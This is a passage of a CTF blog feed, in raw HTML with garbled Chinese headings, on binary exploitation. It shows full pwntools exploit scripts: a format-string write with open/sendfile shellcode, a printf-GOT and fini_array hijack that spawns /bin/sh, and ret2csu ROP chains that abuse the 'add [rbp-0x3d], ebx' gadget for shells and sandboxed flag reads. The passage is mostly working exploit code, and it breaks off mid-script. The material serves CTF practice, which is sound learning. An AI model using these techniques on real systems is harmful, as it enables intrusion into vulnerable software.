class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">bss=0x404060</span><br><span class="line">shellcode  =asm(shellcraft.open(&quot;/flag&quot;))</span><br><span class="line">shellcode +=asm(shellcraft.read(3,bss+0x50,0x100))</span><br><span class="line">shellcode +=asm(shellcraft.write(2,bss+0x50,0x100))</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Let&#x27;s start!&quot;)</span><br><span class="line">payload=b&#x27;%723c%30$hn&#x27;+p64(0x40406b+8)+pay</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><font style="color:rgb(34, 34, 34);"></font><h1 id="æ ˆä¸ŠfmtåŠ«æŒ"><a href="#æ ˆä¸ŠfmtåŠ«æŒ" class="headerlink" title="æ ˆä¸ŠfmtåŠ«æŒ"></a>æ ˆä¸ŠfmtåŠ«æŒ</h1><font style="color:rgb(48, 49, 51);">fmtç›´æ¥ä¿®æ”¹</font><font style="color:rgb(48, 49, 51);">[CISCN 2019è¥¿å—]</font><font style="color:rgb(48, 49, 51);">ç»™å‡ºsystemå‡½æ•°ï¼Œä½†åªæœ‰ä¸€æ¬¡fmtï¼Œ64å­—èŠ‚ï¼Œä¿®æ”¹printf.got-system.plt,fini_array-main</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726716333395-b27c9ea5-5c4d-473e-8786-2edff5f8ded2.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.anna.nssctf.cn&#x27;,25279)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#gdb.attach(p,&#x27;b* 0x080485A8&#x27;)</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">printf=elf.got[&#x27;printf&#x27;]</span><br><span class="line">fini_array=0x0804979C</span><br><span class="line">system=0x080483D0</span><br><span class="line">main=0x08048534</span><br><span class="line">gdb.attach(p, &#x27;b *0x804859E&#x27;)</span><br><span class="line">pause()</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">payload =p32(fini_array+2)+p32(printf+2)+p32(printf)+p32(fini_array)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=&quot;%&quot;+str(0x0804-0x10)+&quot;c%4$hn&quot;   #0804</span><br><span class="line">payload+=&quot;%5$hn&quot;                         #0804</span><br><span class="line">payload+=&quot;%&quot;+str(0x83d0-0x0804)+&quot;c%6$hn&quot; #83d0</span><br><span class="line">payload+=&quot;%&quot;+str(0x8534-0x83d0)+&quot;c%7$hn&quot; #8534</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">sl(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fini_arrayåŠ«æŒ</summary>
    
    
    
    <category term="fmt" scheme="https://www.thir0th.xyz/categories/fmt/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>é­”æ³•çš„gadgetğŸª„</title>
    <link href="https://www.thir0th.xyz/posts/8541dcda.html"/>
    <id>https://www.thir0th.xyz/posts/8541dcda.html</id>
    <published>2025-04-19T16:17:35.000Z</published>
    <updated>2025-04-19T16:17:33.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>ROPgadget â€”binary pwn | grep â€˜addâ€™                                          </p><p> add dword ptr [rbp - 0x3d], ebx ; nop ; ret</p><p>ç©·é€”æœ«è·¯çš„æ—¶å€™ç”¨ï¼Œå°†[rbp-0x3d]+rbxèµ‹å€¼ç»™[rbp-0x3d]ï¼Œé…åˆcsuä½¿ç”¨ã€‚æ•ˆæœç”šä½³</p><p>é€‚ç”¨ï¼šåªå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ— æ‰“å°å‡½æ•°</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h2><p>1.æ›´æ”¹stdinä¸ºone_gadgetæˆ–è€…syscall</p><p>2.call stdin</p><h2 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><h3 id="è®¡ç®—åç§»"><a href="#è®¡ç®—åç§»" class="headerlink" title="è®¡ç®—åç§»"></a>è®¡ç®—åç§»</h3><p>æ‰¾å¯¹åº”ç‰ˆæœ¬çš„libc,è®¡ç®—ä¸stdin(bsså¤´çš„libcåœ°å€)ä¸one_gadget,syscallçš„åç§»</p><p>0xffffffffå¯¹åº”-1</p><p>stdinåç§»æŸ¥æ‰¾</p><ol><li>shift+F12åcarl+Fæœç´¢stdin ,ç¬¬ä¸€ä¸ª<em>IO_2_1_stdin</em></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682273065-36f28678-c805-4698-84e1-43c9926105de.png" alt=""></p><ol><li>Xäº¤å‰å¼•ç”¨ï¼Œçœ‹dataæ®µ</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682363461-322438ee-979b-4565-8d16-c8bb31e1885c.png" alt=""></p><p>3.è·Ÿè¿›ï¼Œæ‰¾åˆ°åç§»</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682406367-e2a845b6-714e-453b-8dfe-2e42693bdc6f.png" alt=""></p><p>4.è®¡ç®—</p><p>0xffffffffå¯¹åº”-1ï¼Œçº¢è‰²ä¸ºstdin,è“è‰²ä¸ºone_gadget/syscall,è®¡ç®—åç§»</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682829379-e28853e5-a765-4bba-bbfa-b8ef8b97c396.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682963330-4fb9a3c7-794e-42e2-b208-7c2f0ab3dc97.png" alt=""></p><h3 id="åˆ©ç”¨å§¿åŠ¿"><a href="#åˆ©ç”¨å§¿åŠ¿" class="headerlink" title="åˆ©ç”¨å§¿åŠ¿"></a>åˆ©ç”¨å§¿åŠ¿</h3><p>1.ç®€å•ï¼Œæ”¹stdinä¸ºone_gadgetï¼Œä¸€èˆ¬é€‰æ‹©rsi,rdxç­‰å¯„å­˜å™¨ä¸ºç©ºçš„ï¼Œå› ä¸ºcsuå¯ä»¥æ§åˆ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(one_gadget)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)+p64(csu_rear)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(stdin)+p64(csu_head)</span><br></pre></td></tr></table></figure><p>ä¸­çº§ï¼Œæ²¡åŠæ³•æ§åˆ¶rax, å¯ä»¥é€šè¿‡readæ§åˆ¶ï¼Œè¯»å…¥å­—èŠ‚æ•°=raxã€‚æ‰¾æ§åˆ¶rax=0çš„gadgetæ”¹stdinä¸ºsyscall ret è°ƒç”¨readåæ§åˆ¶rax=0x3bï¼Œè·å–shellã€‚ç”¨çš„libcä¸­çš„syscall_ret</p><p>ropper â€”file=/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6 â€”search â€œsyscallâ€</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725683449839-79a4d8ed-34de-4805-99fd-add8638ee5a8.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)</span><br><span class="line">s((<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x3b</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é«˜çº§ï¼Œæ²™ç›’ï¼Œç±»ä¼¼çš„ç”¨æ³•ï¼Œé€šè¿‡readæ§åˆ¶raxï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œorwï¼Œè¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722692324147-d6eba25e-5434-4e1c-bd9d-fb9a3283b96f.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">magic=<span class="number">0x000000000040113c</span></span><br><span class="line">csu_head=<span class="number">0x401240</span> </span><br><span class="line">csu_rear=<span class="number">0x40125A</span></span><br><span class="line">stdin=<span class="number">0x404020</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) </span><br><span class="line">payload+=p64(csu_head)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffef7184)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)+p64(csu_rear)+p64(0)*5+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffe76729)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(0)+p64(stdin+0x400)+p64(0x100)+p64(elf.got[&#x27;read&#x27;])+p64(csu_head)+p64(0)*7</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(stdin+0x400)+p64(0)+p64(0)+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0xffe76729</span>)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span 